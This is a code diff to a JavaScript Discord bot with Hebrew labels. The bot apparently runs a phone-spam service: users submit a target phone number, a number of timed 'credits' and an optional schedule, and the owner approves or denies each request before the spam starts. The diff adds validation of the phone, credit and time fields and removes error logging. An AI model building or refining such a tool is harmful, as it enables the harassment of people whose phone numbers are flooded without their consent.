@@ -34,6 +34,26 @@ function saveSpammers() {
 
 let spammers = loadSpammers();
 
+// ========== ולידציה ==========
+function isValidPhone(phone) {
+    // רק ספרות, בין 9 ל-15 תווים, מתחיל ב-0 או +
+    const cleaned = phone.replace(/[\s\-()]/g, '');
+    return /^[0-9+]{9,15}$/.test(cleaned) && /^[0+]/.test(cleaned);
+}
+
+function isValidCredits(credits) {
+    // רק ספרות, בין 1 ל-1000
+    return /^\d{1,4}$/.test(credits) && parseInt(credits) >= 1 && parseInt(credits) <= 1000;
+}
+
+function isValidHour(hour) {
+    return /^\d{1,2}$/.test(hour) && parseInt(hour) >= 0 && parseInt(hour) <= 23;
+}
+
+function isValidMinute(minute) {
+    return /^\d{1,2}$/.test(minute) && parseInt(minute) >= 0 && parseInt(minute) <= 59;
+}
+
 const app = express();
 app.get('/', (req, res) => res.send('OK'));
 app.get('/health', (req, res) => res.send('OK'));
@@ -326,7 +346,7 @@ bot.on('messageCreate', async (message) => {
 // ========== INTERACTIONS ==========
 bot.on('interactionCreate', async (interaction) => {
 
-    // ===== כפתור: Spam (עם cooldown) =====
+    // ===== כפתור: Spam =====
     if (interaction.isButton() && interaction.customId === 'spam_button') {
         const now = Date.now();
         const lastUse = cooldowns.get(interaction.user.id) || 0;
@@ -348,7 +368,7 @@ bot.on('interactionCreate', async (interaction) => {
 
         const phoneInput = new TextInputBuilder()
             .setCustomId('phone')
-            .setLabel('מספר טלפון')
+            .setLabel('מספר טלפון (ספרות בלבד)')
             .setStyle(TextInputStyle.Short)
             .setPlaceholder('0501234567')
             .setRequired(true)
@@ -356,15 +376,15 @@ bot.on('interactionCreate', async (interaction) => {
 
         const creditsInput = new TextInputBuilder()
             .setCustomId('credits')
-            .setLabel('קרדיטים (1 קרדיט = 25 שניות)')
+            .setLabel('קרדיטים (מספרים בלבד)')
             .setStyle(TextInputStyle.Short)
             .setPlaceholder('1')
             .setRequired(true)
-            .setMaxLength(5);
+            .setMaxLength(4);
 
         const hourInput = new TextInputBuilder()
             .setCustomId('hour')
-            .setLabel('שעה (0-23) — ריק = עכשיו')
+            .setLabel('שעה 0-23 (מספרים בלבד)')
             .setStyle(TextInputStyle.Short)
             .setPlaceholder('14')
             .setRequired(false)
@@ -372,7 +392,7 @@ bot.on('interactionCreate', async (interaction) => {
 
         const minuteInput = new TextInputBuilder()
             .setCustomId('minute')
-            .setLabel('דקה (0-59) — ריק = עכשיו')
+            .setLabel('דקה 0-59 (מספרים בלבד)')
             .setStyle(TextInputStyle.Short)
             .setPlaceholder('30')
             .setRequired(false)
@@ -392,13 +412,48 @@ bot.on('interactionCreate', async (interaction) => {
     // ===== טופס Spam =====
     if (interaction.isModalSubmit() && interaction.customId === 'spam_modal') {
         try {
-            const phone = interaction.fields.getTextInputValue('phone');
-            const credits = interaction.fields.getTextInputValue('credits');
+            const phone = interaction.fields.getTextInputValue('phone').trim();
+            const credits = interaction.fields.getTextInputValue('credits').trim();
             const hourRaw = interaction.fields.getTextInputValue('hour').trim();
             const minuteRaw = interaction.fields.getTextInputValue('minute').trim();
 
             await interaction.deferReply({ ephemeral: true });
 
+            // ולידציה - רק מספרים
+            if (!isValidPhone(phone)) {
+                await interaction.editReply({
+                    content: '❌ **מספר טלפון לא תקין**\n\nהמספר חייב להכיל **ספרות בלבד** (9-15 ספרות).\nדוגמה: `0501234567`'
+                });
+                return;
+            }
+
+            if (!isValidCredits(credits)) {
+                await interaction.editReply({
+                    content: '❌ **קרדיטים לא תקינים**\n\nהקרדיטים חייבים להיות **מספרים בלבד** בין 1 ל-1000.'
+                });
+                return;
+            }
+
+            // אם יש שעה — בודק גם אותה
+            if (hourRaw) {
+                if (!isValidHour(hourRaw)) {
+                    await interaction.editReply({
+                        content: '❌ **שעה לא תקינה**\n\nהשעה חייבת להיות **מספרים בלבד** בין 0 ל-23.'
+                    });
+                    return;
+                }
+            }
+
+            if (minuteRaw) {
+                if (!isValidMinute(minuteRaw)) {
+                    await interaction.editReply({
+                        content: '❌ **דקה לא תקינה**\n\nהדקה חייבת להיות **מספרים בלבד** בין 0 ל-59.'
+                    });
+                    return;
+                }
+            }
+
+            // אם אין שעה — שולח מיד
             if (!hourRaw || !minuteRaw) {
                 await requestApproval(interaction, phone, credits, false, null);
                 return;
@@ -406,11 +461,6 @@ bot.on('interactionCreate', async (interaction) => {
 
             const hour = parseInt(hourRaw);
             const minute = parseInt(minuteRaw);
-
-            if (isNaN(hour) || hour < 0 || hour > 23 || isNaN(minute) || minute < 0 || minute > 59) {
-                await interaction.editReply({ content: '❌ שעה או דקה לא תקינות' });
-                return;
-            }
 
             await requestApproval(interaction, phone, credits, true, null, hour, minute);
         } catch (e) {
@@ -517,16 +567,13 @@ bot.on('interactionCreate', async (interaction) => {
             components: []
         });
 
-        // מודיע למבקש שהבקשה אושרה
         try {
             await request.userMessage.edit({
                 content: `✅ **הבקשה אושרה! מתחיל ספאם...**`,
                 embeds: [],
                 components: []
             });
-        } catch (e) {
-            console.log(`[-] Failed to update user message: ${e.message}`);
-        }
+        } catch (e) {}
 
         if (request.scheduled) {
             const id = `spam_${request.phone.slice(-4)}_${Date.now().toString().slice(-4)}`;
@@ -590,16 +637,13 @@ bot.on('interactionCreate', async (interaction) => {
             components: []
         });
 
-        // מחליף את ההודעה של המבקש — לא מוסיף חדשה
         try {
             await request.userMessage.edit({
                 content: `❌ **הבקשה נדחתה על ידי ${OWNER_NAME}.**`,
                 embeds: [],
                 components: []
             });
-        } catch (e) {
-            console.log(`[-] Failed to edit user message: ${e.message}`);
-        }
+        } catch (e) {}
 
         console.log(`[+] Denied: ${requestId}`);
         return;
